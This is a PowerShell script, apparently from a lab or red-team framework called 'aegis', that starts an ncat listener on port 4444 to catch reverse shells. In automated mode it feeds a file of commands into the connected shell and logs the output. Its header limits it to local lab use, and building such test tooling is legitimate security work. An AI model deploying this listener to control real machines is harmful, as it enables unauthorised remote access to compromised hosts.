# deliveries/shared/listener.ps1
#
# Simple PowerShell wrapper for starting a Windows-hosted ncat listener.
#
# Intended for:
#   - reverse shell delivery vectors
#   - Windows + WSL controller workflows
#   - local lab environments only
#
# This script intentionally keeps behavior simple and visible so the operator
# can monitor incoming connections directly.
#
# Environment variables that may be set before invocation:
#
#   $env:LPORT
#   $env:LHOST
#   $env:NCAT_PATH
#
# Defaults:
#   LHOST = 0.0.0.0
#   LPORT = 4444

param()

$ErrorActionPreference = "Stop"

function Log {
    param([string]$Message)
    Write-Host "[+] $Message"
}

function Fail {
    param([string]$Message)
    Write-Host "[x] $Message" -ForegroundColor Red
    exit 1
}

# Listener settings
$LHOST = if ($env:LHOST) { $env:LHOST } else { "0.0.0.0" }
$LPORT = if ($env:LPORT) { $env:LPORT } else { "4444" }

# Default Windows Nmap ncat location
$DefaultNcat = "C:\Program Files (x86)\Nmap\ncat.exe"

$NCAT_PATH = if ($env:NCAT_PATH) {
    $env:NCAT_PATH
} else {
    $DefaultNcat
}

if (-not (Test-Path $NCAT_PATH)) {
    Fail "ncat.exe not found: $NCAT_PATH"
}

Log "Starting PowerShell reverse-shell listener"
Log "Host: $LHOST"
Log "Port: $LPORT"
Log "ncat: $NCAT_PATH"

# NOTE:
# This intentionally runs interactively in the current console so the operator
# can directly observe the session.

$AUTOMATED = if ($env:AUTOMATED) { $env:AUTOMATED.ToLower() } else { "false" }
$COMMANDS_FILE = $env:COMMANDS_FILE
$TranscriptFile = "C:/Windows/Temp/aegis_reverse_transcript_$($env:RUN_ID).log"

if ($AUTOMATED -eq "true") {
    if (-not $COMMANDS_FILE) {
        Fail "COMMANDS_FILE must be set in automated mode"
    }

    if (-not (Test-Path $COMMANDS_FILE)) {
        Fail "Commands file not found: $COMMANDS_FILE"
    }

    Log "Automated mode enabled"
    Log "Using commands file: $COMMANDS_FILE"
    Log "Writing transcript to: $TranscriptFile"

    $Content = [System.IO.File]::ReadAllText($COMMANDS_FILE)
    $Content = $Content -replace "`r`n", "`n"
    $Content = $Content -replace "`r", "`n"
    $Content = $Content + "`nexit`n"

    $TempCommands = "C:/Windows/Temp/aegis_reverse_commands_$($env:RUN_ID).sh"

    [System.IO.File]::WriteAllText(
        $TempCommands,
        $Content,
        [System.Text.UTF8Encoding]::new($false)
    )

    $Output = Get-Content -Raw $TempCommands | & $NCAT_PATH -l $LHOST $LPORT 2>&1

    Remove-Item -Force $TempCommands -ErrorAction SilentlyContinue

    if (-not $Output) {
        $Output = "[no stdout captured from reverse shell]"
    }

    $Output | Out-File -FilePath $TranscriptFile -Encoding utf8
    $Output
} else {
    & $NCAT_PATH --crlf -l $LHOST $LPORT
}
